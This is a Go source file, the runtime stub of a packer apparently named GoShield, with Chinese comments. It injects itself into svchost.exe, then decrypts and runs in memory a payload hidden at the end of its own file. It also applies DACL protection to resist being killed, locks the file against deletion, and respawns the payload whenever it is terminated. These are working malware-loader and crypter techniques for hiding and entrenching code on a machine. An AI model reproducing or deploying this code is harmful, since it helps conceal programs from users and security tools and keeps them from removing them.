// 文件路径: stub/main.go
package main

import (
	"encoding/binary"
	"io"
	"os"

	"github.com/Limkon/GoShield/internal/crypto"
	"github.com/Limkon/GoShield/internal/loader"
	"github.com/Limkon/GoShield/internal/protect"
)

func main() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	// 🌟 1. 终极分流：判断当前是否是潜伏在 svchost.exe 中的幽灵保镖
	originalExe := os.Getenv("GOSHIELD_ORIGINAL_EXE")
	if originalExe != "" {
		// ==========================================
		// === 幽灵保镖逻辑 (此时运行在 svchost.exe 内存中) ===
		// ==========================================
		
		// 开启 DACL 护甲保护幽灵保镖自己，免疫常规强杀
		protect.ProtectProcess()
		// 跨进程死死锁住真正的带壳原文件，防止被用户删除
		protect.LockFile(originalExe)

		// 穿透读取原文件末尾的加密 Payload 核心
		file, err := os.Open(originalExe)
		if err != nil {
			os.Exit(1)
		}

		stat, err := file.Stat()
		if err != nil {
			file.Close()
			os.Exit(1)
		}
		fileSize := stat.Size()

		footerSize := int64(48)
		file.Seek(-footerSize, io.SeekEnd)
		footer := make([]byte, footerSize)
		io.ReadFull(file, footer)

		key := footer[0:32]
		payloadSize := binary.LittleEndian.Uint64(footer[32:40])

		file.Seek(-(footerSize + int64(payloadSize)), io.SeekEnd)
		encryptedPayload := make([]byte, payloadSize)
		io.ReadFull(file, encryptedPayload)
		file.Close()

		// 解密出纯净的真实业务程序
		decryptedPayload, err := crypto.Decrypt(encryptedPayload, key)
		if err != nil {
			os.Exit(1)
		}

		// 无限轮回守护：只要业务程序被杀，幽灵立刻将其拉回复活点！
		for {
			// 以原文件路径作为宿主启动业务程序，完美解决配置文件路径读取问题！
			// Execute 内部会自动给业务程序套上 DACL 防杀护甲
			exitCode, err := loader.Execute(originalExe, decryptedPayload)
			if err != nil {
				break // 底层创建失败直接退出
			}
			
			// ExitCode 为 0 表示正常退出 (如用户点击软件右上角的 X 正常关闭)
			// 此时幽灵保镖也功成身退，退出循环，释放文件锁
			if exitCode == 0 {
				break
			}
			// 否则是被 Win11 内核级黑客工具强杀，循环不退，瞬间原地复活！
		}
		os.Exit(0)
	}

	// ==========================================
	// === 原始父进程逻辑 (用户双击运行时的第一瞬间) ===
	// ==========================================
	
	myExeBytes, err := os.ReadFile(exePath)
	if err == nil {
		// 告诉即将创建的幽灵：你的本体在哪里
		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)

		// 异步将自身 (加壳机外壳) 注入到合法的 svchost.exe 中，启动幽灵保镖
		loader.ExecuteAsync("C:\\Windows\\System32\\svchost.exe", myExeBytes)
	}

	// 献祭：父进程完成孵化幽灵的任务后，立刻自杀！
	// 这样任务管理器里就不会出现两个一模一样的程序名字了！
	os.Exit(0)
}
